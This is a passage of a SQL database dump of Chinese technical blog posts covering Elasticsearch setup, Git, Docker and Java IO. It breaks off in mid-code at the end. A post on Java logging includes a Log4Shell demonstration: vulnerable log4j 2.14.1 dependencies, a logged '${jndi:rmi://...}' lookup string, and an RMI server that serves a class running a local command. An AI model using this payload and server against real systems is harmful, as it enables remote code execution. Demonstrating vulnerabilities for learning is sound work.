以后台方式启动(elasticsearch-x.x.x/bin)\n./elasticsearch -d\n</pre><p>elasticsearch启动常见错误</p><p>max number of threads [xxxx] for user [xx] is too low, increase to at least [xxxx]</p><p>每个进程同时打开文件数太小</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 查看命令\nulimit -Hn\nulimit -Sn\n# /etc/security/limits.conf\n* soft nproc&nbsp;4096\n* hard nproc&nbsp;4096\n</pre><p>max file descriptors [xxxx] for elasticsearch process is too low, increase to at least [xxxx]</p><p>最大线程数太低</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 查看命令\nulimit -Hu\nulimit -Su\n# /etc/security/limits.conf\n* soft nofile 65536\n* hard nofile 65536\n</pre><p>max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</p><pre class=\"ql-syntax\" spellcheck=\"false\"># vim /etc/sysctl.conf\nvm.max_map_count=262145\n# 刷新配置\nsysctl -p\n</pre><p>索引index对应数据库中的表; 文档document对应数据库中行(记录); 字段 fields: 列</p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk6meAE3lqAAB5_h6wuRs46.jpeg',2,0,'220226DP09K1F0SW','es下载列表修改es核心配置文件elasticsearch.yml修改JVM参数(jvm.options)#es不允许root用户操作 useraddesuser chown-Resuser:esuser/usr/local/elasticsearch-x.x.x suesuser whoami #以后台方式启动(elasticsearch-x.x.x/bin) ./elasticsearch-d',0,0,0,NULL,0,0,'2022-03-15 06:13:50','2022-04-24 06:13:50','[\"220424A4ABS92Z7C\",\"220424A4ABSSR30H\"]',NULL),('220424A55D2YRZTC','Git 的基本使用','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">git</span></p><p><span style=\"color: rgb(65, 131, 196);\">Standing on Shoulders of Giants</span></p><p><span style=\"color: rgb(65, 131, 196);\">生成ssh密钥</span></p><p><span style=\"color: rgb(65, 131, 196);\">设置淘宝镜像</span></p><p><span style=\"color: rgb(65, 131, 196);\">初始化一个git仓库</span></p><p><span style=\"color: rgb(65, 131, 196);\">配置全局变量</span></p><p><span style=\"color: rgb(65, 131, 196);\">将文件添加到暂存区</span></p><p><span style=\"color: rgb(65, 131, 196);\">将文件提交到本地仓库（master分支）</span></p><p><span style=\"color: rgb(65, 131, 196);\">查看当前本地仓库的状态（master分支）</span></p><p><span style=\"color: rgb(65, 131, 196);\">查看上次的修改</span></p><p><span style=\"color: rgb(65, 131, 196);\">版本回退</span></p><p><span style=\"color: rgb(65, 131, 196);\">对文件的所有修改必须先add到暂存区（stage） 之后使用commit提交才会对相应的文件作出修改</span></p><p><span style=\"color: rgb(65, 131, 196);\">对于两次修改同一个文件再使用add提交到暂存区会合并两个文件</span></p><p><span style=\"color: rgb(65, 131, 196);\">撤销修改</span></p><p><span style=\"color: rgb(65, 131, 196);\">删除文件</span></p><p><span style=\"color: rgb(65, 131, 196);\">关联远程github仓库</span></p><p><span style=\"color: rgb(65, 131, 196);\">管理分支</span></p><p><span style=\"color: rgb(65, 131, 196);\">查看当前分支</span></p><p><span style=\"color: rgb(65, 131, 196);\">切换到主分支</span></p><p><span style=\"color: rgb(65, 131, 196);\">合并俩个分支</span></p><p><span style=\"color: rgb(65, 131, 196);\">删除dev分支</span></p><h2>git</h2><p><strong><em>世界上最先进的分布式版本控制系统</em></strong></p><h3>Standing on Shoulders of Giants</h3><p>站在巨人的肩膀上</p><h3>生成ssh密钥</h3><pre class=\"ql-syntax\" spellcheck=\"false\">ssh-keygen -t rsa -C \"你的GitHub注册邮箱\"\n</pre><h3>设置淘宝镜像</h3><pre class=\"ql-syntax\" spellcheck=\"false\">npm config set registry https://registry.npm.taobao.org\n# 或者安装cnpm\nnpm install -g cnpm --registry=http://registry.npm.taobao.org #安装淘宝的cnpm 管理器\ncnpm -v # 查看cnpm版本\n</pre><h3>初始化一个git仓库</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git init # 进入一个空白的仓库 初始化生成一个有关仓库配置的.git的隐藏文件\n</pre><p><br></p><h3>配置全局变量</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git config --global user.name \"name\"\ngit config --global user.email \"email\"\n</pre><h3>将文件添加到暂存区</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git add .&nbsp;&nbsp;# 添加该目录下所有文件 \ngit add 文件&nbsp;# 可以一次添加多个文件 空格隔开\n</pre><h3>将文件提交到本地仓库（master分支）</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git commit -m \'本次提交有关的描述\'\n</pre><h3>查看当前本地仓库的状态（master分支）</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git status\n</pre><h3>查看上次的修改</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git diff 文件 # 只有添加到版本库的文件才可以看到文件所作的修改\n</pre><h3>版本回退</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git log # 查看从近到远的提交日志\n</pre><p><br></p><p>commit之后的是版本号</p><pre class=\"ql-syntax\" spellcheck=\"false\">git reset --hard HEAD^ # 回到上一个版本 HEAD代表当前的版本\ngit reset --hard 版本号前几位即可# 从当前版本回到未来的版本\ngit reflog&nbsp;&nbsp;# 查看历史所有的命令\n</pre><h4>对文件的所有修改必须先add到暂存区（stage） 之后使用commit提交才会对相应的文件作出修改</h4><h4>对于两次修改同一个文件再使用add提交到暂存区会合并两个文件</h4><h3>撤销修改</h3><ul><li>文件还没有add到暂存区</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">git checkout -- 文件 # 撤销在工作区对文件所作的任何修改 回到上一次的add或commit时的文件状态 \n</pre><ul><li>文件已经add到暂存区</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">git reset HEAD 文件 # 将对暂存区的修改回退到工作区 需要重新add文件到暂存区\n</pre><h3>删除文件</h3><p>先把文件add到暂存区然后commit到master分支</p><pre class=\"ql-syntax\" spellcheck=\"false\">rm 文件&nbsp;# 把文件从工作区中删除\ngit status # 查看本地仓库的状态 会显示哪些文件被删除\n</pre><p><br></p><p>由于工作区的文件已被删除,暂存区此时也是干净的,而<code style=\"background-color: rgb(243, 244, 244);\">git status</code> 此时会提示工作区和master本地仓库会不一致,要么重新使用命令<code style=\"background-color: rgb(243, 244, 244);\">git rm</code> 把master分支中文件删掉再<code style=\"background-color: rgb(243, 244, 244);\">git commit</code> 此时该文件就真的没有了,要么使用命令<code style=\"background-color: rgb(243, 244, 244);\">git checkout -- 文件</code> 用版本库中的文件覆盖工作区的文件（没有加覆盖就是还原）</p><h3>关联远程github仓库</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git remote add origin git@github.com:github的用户名/仓库名.git\ngit push -u origin master # 第一次将本地master分支的内容全部推送到远程\ngit push # 关联远程仓库的master分支后git push 不用加任何参数\n</pre><h3>管理分支</h3><pre class=\"ql-syntax\" spellcheck=\"false\">git checkout -b dev # 创建并切换分支\ngit switch -c dev&nbsp;# git最新版本提供 创建并切换分支\ngit branch dev&nbsp;# 创建分支\ngit checkout dev# 切换分支\n</pre><h4>查看当前分支</h4><pre class=\"ql-syntax\" spellcheck=\"false\">git branch # 带有*的就是当前分支\n</pre><h4>切换到主分支</h4><pre class=\"ql-syntax\" spellcheck=\"false\">git checkout master\ngit switch master # 最新版本的切换分支命令\n</pre><h4>合并俩个分支</h4><pre class=\"ql-syntax\" spellcheck=\"false\">git merge dev # 用于合并指定分支到当前分支\n</pre><h4>删除dev分支</h4><pre class=\"ql-syntax\" spellcheck=\"false\">git branch -d dev\n</pre><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk6yaAAE0QAAFZz1MkotY65.jpeg',2,0,'220226DP09K1F0SW','目录目录gitStandingonShouldersofGiants生成ssh密钥设置淘宝镜像初始化一个git仓库配置全局变量将文件添加到暂存区将文件提交到本地仓库（master分支）查看当前本地仓库的状态（master分支）查看上次的修改版本回退对文件的所有修改必须先add到暂存区（stage）之后使用commit提交才会对相应的文件作出修改对于两次修改同一个文件再使用add提交到暂存区会合并两',0,0,0,NULL,0,0,'2022-05-01 06:16:18','2022-04-24 06:16:18','[\"220424A55D325FRP\",\"220329D4N9GNBDKP\"]',NULL),('220424A5S09T3WPH','Docker','<p># 目录</p><p><br></p><p>[TOC]</p><p><br></p><p>```properties</p><p># centos7</p><p># step 1: 安装必要的一些系统工具</p><p>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</p><p># Step 2: 添加软件源信息</p><p>sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</p><p># Step 3: 更新并安装 Docker-CE</p><p>sudo yum makecache fast</p><p>sudo yum -y install docker-ce</p><p># Step 4: 开启Docker服务</p><p>sudo service docker start</p><p>```</p><p><br></p><p>```properties</p><p># 安装验证</p><p>docker version</p><p>```</p><p><br></p><p>使用阿里云镜像加速器</p><p><br></p><p>```properties</p><p>sudo mkdir -p /etc/docker</p><p>sudo tee /etc/docker/daemon.json &lt;&lt;-\'EOF\'</p><p>{</p><p>&nbsp;\"registry-mirrors\": [\"https://5kzyw83n.mirror.aliyuncs.com\"]</p><p>}</p><p>EOF</p><p>sudo systemctl daemon-reload</p><p>sudo systemctl restart docker</p><p>```</p><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk65KAKQ-fAABGGCdR5m832.jpeg',2,0,'220226DP09K1F0SW','#目录[TOC]```properties#centos7#step1:安装必要的一些系统工具sudoyuminstall-yyum-utilsdevice-mapper-persistent-datalvm2#Step2:添加软件源信息sudoyum-config-manager--add-repohttp://mirrors.aliyun.com/docker-ce/linux/centos/',0,0,0,NULL,0,0,'2021-10-29 06:18:04','2022-04-24 06:18:04','[\"220329D4N9GNBDKP\",\"220424A5S09T3WPK\"]',NULL),('220424A62W7DF9YW','docker 基本使用','<h1>目录</h1><p><strong>目录</strong></p><p><span>docker</span></p><p><span>docker的基本组成</span></p><p><span>docker镜像基本命令</span></p><p><span>docker容器基本命令</span></p><p><span>docke运行tomcat</span></p><h2>docker</h2><p>docker:解决了运行环境和配置问题的软件容器,方便做持续继承并有助于整体发布的容器虚拟化技术</p><pre># 查看Linux系统版本\ncat /etc/redhat-release\n# CentOS Linux release 7.8.2003 (Core)\n# 查看Linux内核版本\nuname -r\n</pre><h3>docker的基本组成</h3><ul><li>容器(container)</li><li>镜像(image)</li><li>仓库(repository)</li></ul><p>容器是镜像的一个实例,仓库是集中存放镜像的地方</p><h3>docker镜像基本命令</h3><pre>docker --help # 获取帮助命令\ndocker images # 查看本机的docker镜像\n</pre><p>参数列表：</p><p><code>-a</code>列出本地所有的镜像(含中间层的映射层)</p><p><code>-q</code>只显示镜像id</p><p><code>--digests</code>显示镜像的摘要信息</p><p><code>--no-trunc</code>显示完整的镜像信息</p><pre>docker search 镜像名称 # 查找所有的目标镜像\n</pre><p>参数列表：</p><p><code>-s  点赞数</code> 查找大于点赞数的所有目标镜像</p><pre>docker pull 镜像名称【:版本号】# 下载镜像（默认拉取最新的镜像,可以在镜像后面跟着相应的版本号下载对应的版本）\ndocker rmi 镜像名称【:版本号】# 删除目标镜像（默认删除最新镜像,可以在镜像后面跟着相应的版本号删除对应的版本）\n</pre><p><code>-f</code>强制删除</p><pre>docker rmi 镜像名称 镜像名称&nbsp;&nbsp;# 删除多个镜像\ndocker rmi $(docker images -q) # 删除所有的镜像\ndocker commit -m=\"提交的描述信息\" -a=\"作者\" 容器ID 新的镜像名称:版本号 # 提交容器使之成为一个新的镜像\n</pre><h3>docker容器基本命令</h3><pre>docker run [options] 镜像名称\n</pre><p>参数列表：</p><p><code>-i</code> 以交互模式运行容器,通常与<code>-t</code>一起使用</p><p><code>-t</code> 为容器重新分配一个伪终端,通常于<code>-i</code>一起使用</p><p><code>--name</code>自定义要运行容器的名称</p><pre>docker ps # 列出当前正在运行的容器\n</pre><p>参数列表：</p><p><code>-l</code> 查看上次运行的容器</p><p><code>-a</code> 查看所有已经运行过的容器信息</p><p><code>-ql</code>查看上次运行的容器编号</p><p><code>-n 3</code> 查看之前3次运行过的容器</p><pre>exit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 直接结束容器的运行\nctrl + P + Q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 离开容器并不结束后台运行\ndocker attach 容器ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 重新进入容器\ndocker exec -t 容器ID 操作&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 直接将在容器的执行结果返回宿主机\ndocker start 容器名称或者容器ID&nbsp;&nbsp;&nbsp;&nbsp;# 重启容器(后台方式运行容器)&nbsp;\ndocker stop 容器名称或者容器ID&nbsp;&nbsp;&nbsp;&nbsp;# 停止容器&nbsp;\ndocker kill 容器名称或者容器ID&nbsp;&nbsp;&nbsp;&nbsp;# 强制停止容器&nbsp;\n</pre><p><code>attach和exec的区别</code> 前者并不会开启新的进程,而后者会开启新的进程</p><pre>[root@centos ~]# docker exec -t 08e5b25ce2a9 ls -l /tmp \ntotal 8\n-rwx------. 1 root root 1379 Jun 11 02:35 ks-script-585nin8f\n-rwx------. 1 root root&nbsp;671 Jun 11 02:35 ks-script-z6zw_bhq\nfailed to resize tty, using default size\n[root@centos ~]# \ndocker rm 容器名称或者容器ID&nbsp;&nbsp;&nbsp;# 删除历史运行过的容器记录\ndocker rm -f 容器名称或ID&nbsp;&nbsp;&nbsp;&nbsp;# 强制删除正在运行的容器\ndocker rm -f $(docker ps -q)&nbsp;&nbsp;# 强制删除所有正在运行的容器\ndocker rm $(docker ps -aq)&nbsp;&nbsp;# 一次性删除多个历史容器记录\ndocker ps -qa | xargs docker rm \ndocker run -d 镜像名称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 以守护进程方式运行容器\ndocker top 容器ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 查看容器内运行的进程\ndocker inspect 容器ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 查看容器内部细节\ndocker cp 镜像ID:容器文件路径 宿主机目标路径 # 将容器中的文件复制到宿主机中\ndocker logs -ft --tail=3 容器ID # 查看容器日志\n</pre><p><code>-f</code>:跟随最新的日志打印</p><p><code>-t</code>:加入时间戳</p><p><code>tail  数字</code>:显示最后多少条</p><h3>docke运行tomcat</h3><pre>docker run -it -p 8848:8080 tomcat # 以交互式运行tomcat \n</pre><p><code>-p</code> 指定docker映射tomcat访问端口</p><p><code>-P</code> 随机指定docker映射tomcat访问端口</p><pre>docker run -d -p 8848:8080 tomcat&nbsp;# 以守护进程的方式启动tomcat\n</pre><p><br></p><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk68qADeZoAAAnEkmew0o17.jpeg',2,0,'220226DP09K1F0SW','目录目录dockerdocker的基本组成docker镜像基本命令docker容器基本命令docke运行tomcatdockerdocker:解决了运行环境和配置问题的软件容器,方便做持续继承并有助于整体发布的容器虚拟化技术#查看Linux系统版本 cat/etc/redhat-release #CentOSLinuxrelease7.8.2003(Core) #查看Linux内核版本 uname',0,0,0,NULL,0,0,'2022-03-31 06:19:01','2022-04-25 06:50:44','[\"220329D4N9GNBDKP\",\"220424A62W7HXWX4\"]',NULL),('220424A6RG0CY4PH','Java 日志体系','<h3>log4j漏洞演示</h3><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--使用log4j日志; &lt;=2.14.1; &gt;= 2.15.0修复--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;2.14.1&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;2.14.1&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--log4j2.xml--&gt;\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;Configuration status=\"WARN\"&gt;\n &lt;!--全局参数--&gt;\n &lt;Properties&gt;\n  &lt;Property name=\"pattern\"&gt;log4j2: %d{yyyy-MM-dd HH:mm:ss} %5p [%t] - %m%n&lt;/Property&gt;\n &lt;/Properties&gt;\n &lt;Loggers&gt;\n  &lt;Root level=\"INFO\"&gt;\n   &lt;AppenderRef ref=\"console\"/&gt;\n  &lt;/Root&gt;\n &lt;/Loggers&gt;\n &lt;Appenders&gt;\n  &lt;!-- 定义输出到控制台 --&gt;\n  &lt;Console name=\"console\" target=\"SYSTEM_OUT\" follow=\"true\"&gt;\n   &lt;!--控制台只输出level及以上级别的信息--&gt;\n   &lt;ThresholdFilter level=\"INFO\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/&gt;\n   &lt;PatternLayout&gt;\n    &lt;Pattern&gt;${pattern}&lt;/Pattern&gt;\n   &lt;/PatternLayout&gt;\n  &lt;/Console&gt;\n &lt;/Appenders&gt;\n&lt;/Configuration&gt;\n# log4j.properties\nlog4j.rootLogger=DEBUG, stdout\nlog4j.appender.stdout.Target = System.out\nlog4j.appender.stdout=org.apache.log4j.ConsoleAppender\nlog4j.appender.stdout.layout=org.apache.log4j.PatternLayout\nlog4j.appender.stdout.layout.ConversionPattern=%5p [%t] - %m%n\npackage cn.qingweico;\n​\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n​\n/**\n * -Dlog4j2.formatMsgNoLookups=true\n * @author zqw\n * @date 2022/3/13\n */\npublic class LogTest {\n&nbsp;&nbsp;private static final Logger logger = LogManager.getLogger(\"log4j\");\n&nbsp;&nbsp;public static void main(String[] args) {\n&nbsp;&nbsp;&nbsp;&nbsp;String username=\"${java:os}\";\n&nbsp;&nbsp;&nbsp;&nbsp;logger.info(\"Hello, {}\",username);\n&nbsp;}\n}\n​\n&lt;!--使用slf4j日志--&gt;\n&lt;!--slf4j适配log4j2--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;2.12.1&lt;/version&gt;\n&lt;/dependency&gt;\npackage cn.qingweico;\n​\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n​\n/**\n * @author zqw\n * @date 2022/3/13\n */\npublic class LogTest {\n&nbsp;&nbsp;private static&nbsp;final Logger logger = LoggerFactory.getLogger(\"slf4j\");\n&nbsp;&nbsp;public static void main(String[] args) {\n&nbsp;&nbsp;&nbsp;&nbsp;String username=\"${jndi:rmi://127.0.0.1:8080/lookup}\";\n&nbsp;&nbsp;&nbsp;&nbsp;logger.info(\"Hello, {}\",username);\n&nbsp;}\n}\npackage cn.qingweico;\n​\nimport java.io.IOException;\n​\n/**\n * @author zqw\n * @date 2022/3/13\n */\npublic class Look {\n&nbsp;static {\n&nbsp;&nbsp;&nbsp;try {\n&nbsp;&nbsp;&nbsp;&nbsp;Runtime.getRuntime().exec(\"calc\");\n&nbsp;&nbsp;} catch (IOException e) {\n&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();\n&nbsp;&nbsp;}\n&nbsp;}\n}\npackage cn.qingweico;\n​\n​\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\n​\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport java.rmi.AlreadyBoundException;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n​\n/**\n * @author zqw\n * @date 2022/3/13\n */\npublic class RmiServer {\n&nbsp;public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {\n&nbsp;&nbsp;&nbsp;Registry registry = LocateRegistry.createRegistry(8080);\n&nbsp;&nbsp;&nbsp;registry.bind(\"lookup\", new ReferenceWrapper(new Reference(\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null, \"cn.qingweico.Look\", null\n&nbsp;&nbsp;)));\n&nbsp;}\n}\n</pre><h3>日志适配和桥接</h3><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;!--jcl --&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;commons-logging&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.2&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--log4j--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;log4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.2.17&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--slf4j --&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.7.25&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--slf4j适配log4j1.x --&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.7.25&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--slf4j适配log4j2--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;2.12.1&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--slf4j适配jcl--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;slf4j-jcl&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.7.25&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!--log4j 桥接到 slf4j--&gt;\n&lt;dependency&gt;\n&nbsp;&nbsp;&lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n&nbsp;&nbsp;&lt;artifactId&gt;log4j-over-slf4j&lt;/artifactId&gt;\n&nbsp;&nbsp;&lt;version&gt;1.7.25&lt;/version&gt;\n&lt;/dependency&gt;\n</pre><p>名称jar包描述log4jlog4j-xxx.jar早期常用日志组件logbacklogback-core、logback-classic、logback-access一套日志组件的实现 性能优于log4jlog4j2log4j、log4-api 、log4j-coreapache 开发的一款log4j的升级产品java.util.loggingjdkJava 1.4 以来的官方日志实现</p><p>适配器</p><p><span class=\"ql-font-monospace\"><img src=\"https://cdn.qingweico.cn/blog/Java%E6%97%A5%E5%BF%97%20(1).png\" alt=\"Java日志 (1)\"></span></p><p>桥接器</p><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7CqAG9W9AACoq9gA2xQ96.jpeg',2,0,'220226DP09K1F0SW','log4j漏洞演示&lt;!--使用log4j日志;&lt;=2.14.1;&gt;=2.15.0修复--&gt; &lt;dependency&gt; &nbsp;&nbsp;&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &nbsp;&nbsp;&lt;artifactId&gt;log4j-api&lt;/artifactId&',0,0,0,NULL,0,0,'2022-04-09 06:21:01','2022-04-24 06:21:01','[\"220329D180W7F2RP\",\"220424A6RG0H9NMW\"]',NULL),('220424A7NM5WNA14','Java IO','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">IO</span></p><p><span style=\"color: rgb(65, 131, 196);\">常用的流</span></p><p><span style=\"color: rgb(65, 131, 196);\">FileInputStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">FileOutputStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">使用字节流完成文件的复制</span></p><p><span style=\"color: rgb(65, 131, 196);\">FileReader</span></p><p><span style=\"color: rgb(65, 131, 196);\">FileWriter</span></p><p><span style=\"color: rgb(65, 131, 196);\">使用字符流完成文件的复制</span></p><p><span style=\"color: rgb(65, 131, 196);\">BufferedInputStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">BufferedOutputStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">BufferedReader</span></p><p><span style=\"color: rgb(65, 131, 196);\">BufferedWriter</span></p><p><span style=\"color: rgb(65, 131, 196);\">使用BufferedReader和BufferedWriter</span></p><p><span style=\"color: rgb(65, 131, 196);\">InputStreamReader</span></p><p><span style=\"color: rgb(65, 131, 196);\">OutputStreamWriter</span></p><p><span style=\"color: rgb(65, 131, 196);\">PrintStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">PrintWriter</span></p><p><span style=\"color: rgb(65, 131, 196);\">boolean endWith()</span></p><p><span style=\"color: rgb(65, 131, 196);\">递归遍历一个文件夹下所有的文件</span></p><p><span style=\"color: rgb(65, 131, 196);\">复制文件并更改后缀名</span></p><p><span style=\"color: rgb(65, 131, 196);\">Scanner</span></p><p><span style=\"color: rgb(65, 131, 196);\">LineNumberReader</span></p><p><span style=\"color: rgb(65, 131, 196);\">ByteArrayOutputStream</span></p><p><span style=\"color: rgb(65, 131, 196);\">通过键盘输入的两种方法</span></p><h2>IO</h2><p><span class=\"ql-font-monospace\"><img src=\"https://cdn.qingweico.cn/blog/5f7ea8f91cd1bbb86ba8c15c.png\" alt=\"未命名文件\"></span></p><p><span class=\"ql-font-monospace\"><img src=\"https://cdn.qingweico.cn/blog/5ef3034f14195aa594c4649d.png\" alt=\"CharStream\"></span></p><h3>常用的流</h3><p>流根据方向可以分为输入流和输出流 (相对内存而言), 输入流也叫Read(读), 输出流也叫Write(写)</p><p>流根据类型分为字节流和字符流, 前者一次读取一个字节, 后者一次读取两个字节</p><p>按照流是否直接与特定的地方 (如磁盘、内存、设备等) 相连, 分为节点流和处理流两类</p><p>节点流</p><ul><li>FileInputStream</li><li>FileOutputStream</li><li>FileReader</li><li>FileWriter</li><li>StringReader</li><li>StringWriter</li><li>ByteArrayInputStream</li><li>ByteArrayOutputStream</li><li>CharArrayReader</li><li>CharArrayWriter</li><li>PipedInputStream</li><li>PipedOutputStream</li><li>PipedReader</li><li>PipedWriter</li></ul><p>处理流</p><ul><li>BufferedInputStream</li><li>BufferedOutputStream</li><li>BufferedReader</li><li>BufferedWriter</li><li>InputStreamReader</li><li>OutputStreamWriter</li><li>ObjectInputStream</li><li>ObjectOutputStream</li><li>DataInputStream</li><li>DataOutputStream</li><li>PrintStream</li><li>PrintWriter</li></ul><h3>FileInputStream</h3><p>文件字节输入流: 将计算机硬盘中的内容写到内存中</p><p>int read()</p><p>文件temp.txt的内容为abcdefg 注意不要换行</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileInputStream;\nimport java.io.IOException;\n​\npublic class ByteStream {\n&nbsp;&nbsp;public static void main(String[] args) {\n&nbsp;&nbsp;&nbsp;&nbsp;FileInputStream fis = null;\n&nbsp;&nbsp;&nbsp;&nbsp;try {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 可以是相对路径, 也可以是绝对路径\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String filePath = \"src/io/temp.txt\";\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fis = new FileInputStream(filePath);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int temp;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while ((temp = fis.read()) != -1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(temp);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;} catch (IOException e) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();\n&nbsp;&nbsp;&nbsp;} finally {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (fis != null) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fis.close();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IOException e) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\n</pre><p>int read(byte[] bytes)</p><p>读取数据之前在内存中准备一个字节数组,一次读取多个字节存入字节数组中,效率高; 返回每次读取到数据的字节长度</p><pre class=\"ql-syntax\" spellcheck=\"false\">package io;\n​\nimport java.io.FileInputStream;\nimport 